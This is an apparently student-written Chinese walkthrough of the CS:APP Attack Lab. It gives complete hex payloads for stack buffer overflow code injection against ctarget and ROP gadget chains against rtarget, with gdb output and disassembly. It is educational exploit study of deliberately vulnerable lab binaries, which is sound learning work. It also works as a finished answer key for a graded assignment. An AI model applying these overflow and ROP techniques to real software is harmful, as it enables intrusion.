# Attack Lab

## 准备工作

直接反编译就可得到所有函数的地址，下文不再赘述。

注意在小端序机器上，地址要按照小端序写。

payload指的是填进缓冲区的字符串（字节）。

函数`getbuf`的反编译代码：

```
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
```

可以看到缓冲区大小为40字节(0x28)。

## Part.1 Code Injection Attacks

攻击ctarget

### Lv.1

目标是从getbuf返回到touch1。缓冲区内存区域往高位紧接着就是返回地址，直接覆盖掉就行。

```
20 20 20 20 20 20 20 20
20 20 20 20 20 20 20 20
20 20 20 20 20 20 20 20
20 20 20 20 20 20 20 20
20 20 20 20 20 20 20 20 /* 填充40字节的缓冲区 */
c0 17 40 00 00 00 00 00 /* touch1函数的地址 */
```

### Lv.2

目标是从getbuf返回到touch2，并传递cookie作为参数。步骤如下：

1. 让getbuf返回到payload中的代码
2. payload中的代码将cookie写入%rax
3. 从payload返回到touch2

首先我们需要知道payload中代码的地址。gdb走起

```
# gdb ./ctarget
(gdb) break Gets
Breakpoint 1 at 0x401a40
(gdb) r -q
Starting program: /home/cmdblock/Desktop/target1/ctarget -q
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
Cookie: 0x59b997fa

Breakpoint 1, 0x0000000000401a40 in Gets ()
(gdb) print /x $rdi
$1 = 0x5561dc78
(gdb) print /x $rsp
$2 = 0x5561dc70
```

读取当前栈指针以及Gets的第一个参数。由gdb反馈可知缓冲区的起始地址为`0x5561dc78`。

接下来构造payload程序：

```asm
movl $0x59b997fa,%edi # 将cookie放进参数寄存器
push $0x4017ec # 将返回地址设置成touch2的地址
ret
```

由此构造payload：

```
bf fa 97 b9 59          /* movl $0x59b997fa,%edi */
68 ec 17 40 00          /* push $0x4017ec */
c3                      /* ret */
20 20 20 20 20 20 20 20
20 20 20 20 20 20 20 20
20 20 20 20 20 20 20 20
20 20 20 20 20          /* 填充缓冲区剩余部分 */
78 dc 61 55 00 00 00 00 /* 代码地址作为getbuf的返回地址 */
```

getbuf返回到payload中后，由于返回地址被弹出栈，栈指针指向的位置比buf尾部高8字节。此时将touch2的返回地址push进栈中，touch2的地址会被放置在原来的返回地址处，不会影响到我们的程序代码。

### Lv.3

目标是从getbuf返回到touch3，并传递cookie**字符串**作为参数。和上一题思路相同，但是实操上有两点不同。

- 要传递字符串实际上是传递字符串指针。这个字符串需要被构造在payload里，并向touch3传递地址
- 在验证字符串的合法性时，程序会调用hexmatch函数，可能会对栈上的数据产生影响，必须避免这种影响。

为了避免后续调用对栈上的payload产生影响，我们可用使得栈指针指向的位置低于buf的内存空间。

之前得出过buf的地址是`0x5561dc78`。我们将cookie串放在payload的开头，则cookie串的地址就是buf的地址。于是构造程序如下：

```asm
movl $0x5561dc78,%esp # 将栈指针设在buf开头位置，避免后续过程影响payload
movl $0x5561dc78,%edi # 将cookie字符串地址作为第一个参数，which is buf的地址
push $0x4018fa # 将返回地址设置为touch3
ret
```

由此构造payload：

```
35 39 62 39 39 37 66 61 /* cookie字符串 位于payload开头 */
00 00 00 00 00 00 00 00 /* 字符串需要\0结尾 为了好看就搞8字节 */
bc 78 dc 61 55          /* movl $0x5561dc78,%esp */
bf 78 dc 61 55          /* movl $0x5561dc78,%edi */
68 fa 18 40 00          /* push $0x4018fa */
c3                      /* ret */
20 20 20 20 20 20 20 20 /* 填充缓冲区剩余部分 */
88 dc 61 55 00 00 00 00 /* 将代码地址(buf+16)作为getbuf的返回地址 */
```

## Part.2 Return-Oriented Programming

### Lv.1

同Part.1 Lv.1

### Lv.2

目标是从getbuf返回到touch2(`0x4017ec`)，并传递cookie作为参数。

为了传递参数，需要通过寄存器%rdi。在farm中查找相关gadget。

```
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   
```

提取其中的代码，地址`0x4019c5`有如下代码：

```asm
4019c5:
  movq %rax %rdi # 48 89 c7
  nop            # 90
  ret            # c3
```

于是我们还需要将cookie放进寄存器%rax。查找farm发现：

```
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   
```

在`0x4019cc`处有如下代码：

```asm
4019cc:
  popq %rax # 58
  nop       # 90
  ret       # c3
```

所以我们应该将cookie放置在payload中的合适位置，使其被popq指令从栈弹出到%rax中。

构造payload如下：

```
20 20 20 20 20 20 20 20
20 20 20 20 20 20 20 20
20 20 20 20 20 20 20 20
20 20 20 20 20 20 20 20
20 20 20 20 20 20 20 20 /* 填充缓冲区 */
cc 19 40 00 00 00 00 00 /* 从getbuf返回到0x4019cc，将栈上的cookie弹出到%rax */
fa 97 b9 59 00 00 00 00 /* cookie，供popq弹出到%rax */
c5 19 40 00 00 00 00 00 /* 返回到0x4019c5 cookie传送到%rdi中作为param1 */
ec 17 40 00 00 00 00 00 /* 返回到touch2(0x4017ec)，则cookie为其第一个参数 */
```

### Lv.3

目标是从getbuf返回到touch3，并传递cookie**字符串**作为参数。

为了避免后续调用对栈上的cookie字符串产生影响，除了使得栈指针指向的位置低于buf的内存空间以外，还可以把cookie串放在较高的位置。这样做的原因是可用的gadgets几乎无法对栈指针寄存器%rsp进行有效的修改操作（其实有一个popq %rsp，但是……你认真的？）。

为了获得cookie串的地址，我们需要栈的地址来进行推断。farm中提供了获取%rsp值的途径：

```
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq   
```

提取代码：

```asm
401a06:
  movq %rsp %rax # 48 89 e0
  ret            # c3
```

这样会把栈指针的值存进%rax中。

得到了某时刻的栈指针，我们还需要对其进行一个加法操作，加上一个在我们构造payload时确定的偏移量才能最终确定cookie串的地址。

显然，传入外部信息的途径只有payload。要从栈上的payload中获取这个偏移量，可用的gadget只有popq。

```
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   
```

提取代码如下：

```asm
4019ab:
  popq %rax # 58
  nop       # 90
  ret       # c3
```

这段代码可以从栈中弹出一个值存进%rax。因为我们可以通过payload操纵栈的内容，所以相当于我们可以对%rax进行任意赋值。

下面的问题是如何进行加法操作。farm中有一个显然的加法函数：

```
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   
```

为了向这个函数传参，我们需要将两个加数：某时刻的%rsp和偏移量，分别放进%rdi(param1)和%rsi(param2)。从这两个目标寄存器反推，在farm中进行查找，能够发现以下两个传送途径：

```
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   
```

提取代码：

```asm
4019c5:
  movq %rax %rdi # 48 89 c7
  nop            # 90
  ret            # c3
```

这条途径将%rax中的值传送给第一个参数寄存器%rdi。

```
00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq   

0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq   

0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq   
```

提取代码如下：

```asm
4019dd:
  movl %eax %edx # 89 c2
  nop            # 90
  ret            # c3

401a34:
  movl %edx %ecx # 89 d1
  nop            # 38 c9
  ret            # c3

401a13:
  movl %ecx %esi # 89 ce
  nop            # 90
  nop            # 90
  ret            # c3
```

这条途径通过三个步骤将%eax的值传送给第二个参数寄存器%esi，且过程中不影响第一个参数寄存器%edi。

整理一下所有的gadgets：

```asm
401a06: movq %rsp %rax # 取出当前的栈指针到%rax
4019c5: movq %rax %rdi # 将这个指针传送到param1

4019ab: popq %rax      # 从栈上弹出实现确定好的偏移量
4019dd: movl %eax %edx
401a34: movl %edx %ecx
401a13: movl %ecx %esi # 将偏移量传送到param2

4019d6: lea (%rdi,%rsi,1),%rax # 将两个值相加，得到cookie串的地址
4019c5: movq %rax %rdi # 将cookie串指针传送到param1
```

执行完上述操作之后，返回到touch3函数即可，此时cookie串的指针会作为其第一个参数。

综上，构造payload如下：

```
20 20 20 20 20 20 20 20
20 20 20 20 20 20 20 20
20 20 20 20 20 20 20 20
20 20 20 20 20 20 20 20
20 20 20 20 20 20 20 20 /* 填充缓冲区 */
06 1a 40 00 00 00 00 00 /* 401a06: movq %rsp %rax 取出当前的栈指针 */
/* 取出栈指针时，栈指针指向此处 */
c5 19 40 00 00 00 00 00 /* 4019c5: movq %rax %rdi 将这个指针传送到param1 */
ab 19 40 00 00 00 00 00 /* 4019ab: popq %rax 从栈上弹出实现确定好的偏移量(0x48) */
48 00 00 00 00 00 00 00 /* 偏移量，值为取出栈指针时栈指针地址和cookie字符串地址的差值 */
dd 19 40 00 00 00 00 00 /* 4019dd: movl %eax %edx */
34 1a 40 00 00 00 00 00 /* 401a34: movl %edx %ecx */
13 1a 40 00 00 00 00 00 /* 401a13: movl %ecx %esi 将偏移量传送到param2 */
d6 19 40 00 00 00 00 00 /* 返回到函数add_xy(0x4019d6)，实现加法，将结果存放进返回值寄存器%eax */
c5 19 40 00 00 00 00 00 /* 4019c5: movq %rax %rdi 将cookie串指针传送到param1 */
fa 18 40 00 00 00 00 00 /* 返回到touch3(0x4018fa)，cookie串指针为第一个参数 */
35 39 62 39 39 37 66 61 00  /* cookie字符串，\0结尾 */
```

